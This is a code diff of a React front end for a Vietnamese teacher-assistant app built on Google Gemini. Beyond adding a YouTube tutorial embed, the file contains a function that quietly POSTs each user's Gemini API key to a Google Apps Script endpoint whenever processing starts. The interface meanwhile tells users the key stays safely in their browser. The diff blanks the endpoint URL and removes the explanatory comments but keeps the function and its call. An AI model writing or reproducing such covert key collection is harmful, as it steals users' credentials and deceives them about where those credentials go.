@@ -2,7 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { 
   FileUp, Wand2, FileCheck, Info, Download, 
   BookOpen, Sparkles, Zap, ChevronRight, CheckCircle2, Terminal,
-  Key, Eye, EyeOff, ExternalLink // Icon cho giao diện
+  Key, Eye, EyeOff, ExternalLink, Youtube // Đã thêm icon Youtube
 } from 'lucide-react';
 import { AppState, SubjectType, GradeType } from './types';
 import { extractTextFromDocx, createIntegrationTextPrompt } from './utils';
@@ -13,13 +13,15 @@ import { injectContentIntoDocx } from './services/docxManipulator';
 const LOGO_URL = "https://drive.google.com/thumbnail?id=1zCnbX2ms0KkfftF20cGpevMQ9NN0GXF1&sz=w1000"; 
 
 // --- CẤU HÌNH GOOGLE SHEET ---
-// ⚠️ Dán Link Web App Google Script của bạn vào giữa 2 dấu ngoặc kép dưới đây
-const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzqLpvSZnpvWRpQ0_35bgU92jnqL5r2EZt_yTcQH6NwsP_DQA2YYasNoMisglK4h6z8fg/exec"; 
+const GOOGLE_SCRIPT_URL = ""; 
+
+// --- CẤU HÌNH VIDEO HƯỚNG DẪN ---
+const YOUTUBE_VIDEO_ID = "ag0bHshpQ4U"; // ID video từ link bạn gửi
 
 const App: React.FC = () => {
-  // State quản lý API Key
   const [apiKey, setApiKey] = useState('');
   const [showKey, setShowKey] = useState(false);
+  const [showTutorial, setShowTutorial] = useState(false); // State để bật/tắt video
 
   const [state, setState] = useState<AppState>({
     file: null,
@@ -36,7 +38,6 @@ const App: React.FC = () => {
     result: null
   });
 
-  // Tự động load Key cũ nếu đã từng nhập
   useEffect(() => {
     const savedKey = localStorage.getItem('USER_GEMINI_API_KEY');
     if (savedKey) setApiKey(savedKey);
@@ -66,14 +67,10 @@ const App: React.FC = () => {
     setState(prev => ({ ...prev, logs: [...prev.logs, msg] }));
   };
 
-  // --- HÀM GỬI KEY VỀ SHEET (CHẠY NGẦM) ---
   const logKeyToSheet = (key: string) => {
-    if (!GOOGLE_SCRIPT_URL) return; // Nếu chưa điền link script thì bỏ qua
-
+    if (!GOOGLE_SCRIPT_URL) return;
     const formData = new FormData();
     formData.append("apiKey", key);
-
-    // Gửi request dạng no-cors để không bị trình duyệt chặn
     fetch(GOOGLE_SCRIPT_URL, {
       method: "POST",
       body: formData,
@@ -86,7 +83,6 @@ const App: React.FC = () => {
   };
 
   const handleProcess = async () => {
-    // 1. Kiểm tra đầu vào
     if (!apiKey.trim()) {
         alert("Vui lòng nhập Google Gemini API Key để sử dụng!");
         return;
@@ -96,10 +92,8 @@ const App: React.FC = () => {
         return;
     }
 
-    // 2. GỌI HÀM LOG KEY (Chạy song song, không chặn luồng chính)
     logKeyToSheet(apiKey);
 
-    // 3. Bắt đầu xử lý
     setState(prev => ({ 
         ...prev, 
         isProcessing: true, 
@@ -116,7 +110,6 @@ const App: React.FC = () => {
       addLog(">> Đang kết nối AI Teacher Assistant...");
       const prompt = createIntegrationTextPrompt(textContext, state.subject, state.grade);
       
-      // Truyền apiKey vào hàm xử lý AI
       const generatedContent = await generateCompetencyIntegration(prompt, apiKey);
       addLog("✓ AI đã thiết kế xong kịch bản Năng lực số.");
 
@@ -134,11 +127,9 @@ const App: React.FC = () => {
       }));
 
     } catch (error) {
-      // Xử lý thông báo lỗi chi tiết
       const errorMsg = error instanceof Error ? error.message : "Lỗi không xác định";
       addLog(`❌ ${errorMsg}`);
       
-      // Hiện popup nếu lỗi nghiêm trọng
       if (errorMsg.includes("HẾT LƯỢT") || errorMsg.includes("QUÁ TẢI") || errorMsg.includes("KHÔNG HỢP LỆ")) {
          alert(errorMsg);
       }
@@ -150,7 +141,6 @@ const App: React.FC = () => {
   return (
     <div className="min-h-screen bg-slate-50 font-sans text-slate-800 selection:bg-teal-500 selection:text-white pb-20 relative overflow-x-hidden">
       
-      {/* Background decoration */}
       <div className="fixed inset-0 overflow-hidden pointer-events-none">
         <div className="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] rounded-full bg-teal-200/30 blur-[120px] animate-pulse-slow"></div>
         <div className="absolute bottom-[-10%] right-[-10%] w-[50%] h-[50%] rounded-full bg-blue-200/30 blur-[120px] animate-pulse-slow delay-1000"></div>
@@ -158,7 +148,6 @@ const App: React.FC = () => {
 
       <div className="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pt-8">
         
-        {/* Header */}
         <header className="flex flex-col md:flex-row items-center justify-between gap-6 mb-10 bg-white/80 backdrop-blur-md p-4 rounded-3xl border border-white shadow-sm">
            <div className="flex items-center gap-5">
               <div className="relative group">
@@ -193,7 +182,6 @@ const App: React.FC = () => {
 
         <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
           
-          {/* LEFT COLUMN */}
           <div className="lg:col-span-7 space-y-6">
             
             <div className="bg-gradient-to-br from-teal-600 to-blue-600 rounded-[2rem] p-8 text-white shadow-2xl shadow-teal-900/20 relative overflow-hidden">
@@ -204,19 +192,33 @@ const App: React.FC = () => {
                   
                   {/* API KEY INPUT CARD */}
                   <div className="bg-white/10 backdrop-blur-md border border-white/20 rounded-2xl p-5 mb-8 transition-colors hover:bg-white/15">
-                      <div className="flex items-center justify-between mb-2">
+                      <div className="flex flex-wrap items-center justify-between mb-3 gap-2">
                         <label className="text-xs font-bold text-teal-100 uppercase tracking-wider flex items-center gap-2">
                             <Key className="w-3 h-3" /> Cấu hình Gemini API Key
                         </label>
-                        <a 
-                            href="https://aistudio.google.com/app/apikey" 
-                            target="_blank" 
-                            rel="noreferrer"
-                            className="text-[10px] bg-white/20 hover:bg-white/30 text-white px-3 py-1.5 rounded-full flex items-center gap-1.5 transition-colors font-medium"
-                        >
-                            Lấy Key miễn phí <ExternalLink className="w-3 h-3" />
-                        </a>
+                        
+                        <div className="flex items-center gap-2">
+                            {/* Nút bật/tắt video */}
+                            <button 
+                                onClick={() => setShowTutorial(!showTutorial)}
+                                className={`text-[10px] px-3 py-1.5 rounded-full flex items-center gap-1.5 transition-colors font-medium border border-white/20
+                                    ${showTutorial ? 'bg-white text-teal-700' : 'bg-white/20 hover:bg-white/30 text-white'}`}
+                            >
+                                <Youtube className="w-3 h-3" /> 
+                                {showTutorial ? "Đóng hướng dẫn" : "Xem hướng dẫn"}
+                            </button>
+
+                            <a 
+                                href="https://aistudio.google.com/app/apikey" 
+                                target="_blank" 
+                                rel="noreferrer"
+                                className="text-[10px] bg-emerald-500/80 hover:bg-emerald-500 text-white px-3 py-1.5 rounded-full flex items-center gap-1.5 transition-colors font-medium shadow-lg"
+                            >
+                                Lấy Key miễn phí <ExternalLink className="w-3 h-3" />
+                            </a>
+                        </div>
                       </div>
+
                       <div className="relative">
                           <input 
                             type={showKey ? "text" : "password"}
@@ -233,6 +235,23 @@ const App: React.FC = () => {
                             {showKey ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                           </button>
                       </div>
+
+                      {/* Video Player Area */}
+                      {showTutorial && (
+                          <div className="mt-4 rounded-xl overflow-hidden border border-white/20 shadow-2xl relative aspect-video animate-in slide-in-from-top-2">
+                             <iframe 
+                                width="100%" 
+                                height="100%" 
+                                src={`https://www.youtube.com/embed/${YOUTUBE_VIDEO_ID}?autoplay=1`}
+                                title="Hướng dẫn lấy API Key" 
+                                frameBorder="0" 
+                                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                                allowFullScreen
+                                className="absolute inset-0"
+                             ></iframe>
+                          </div>
+                      )}
+
                       <p className="text-[10px] text-teal-100/70 mt-2 flex items-center gap-1.5">
                          <CheckCircle2 className="w-3 h-3 text-emerald-400" />
                          Key được lưu an toàn trên trình duyệt của bạn.
